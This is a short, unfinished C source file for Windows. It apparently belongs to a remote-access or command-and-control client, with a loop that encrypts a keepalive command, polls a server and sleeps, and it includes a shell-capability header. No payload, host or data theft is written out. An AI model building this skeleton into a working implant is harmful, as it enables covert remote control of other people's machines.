#include "crypt.h"
#include "comm.h"
#include "capabilities/shell.h"
#include "parser.h"
#include "protocol.h"
#include <windows.h>


/**
 * This function will run the keepalive loop that looks for new commands and notifies the server that the client is alive.
 */
int main(){
    while(1){
        CommandType keepalive = CMD_KEEPALIVE;
        char* command = commands[keepalive];
        char* encrypted_command = encrypt(command);
        


        Sleep(15000);
    }


}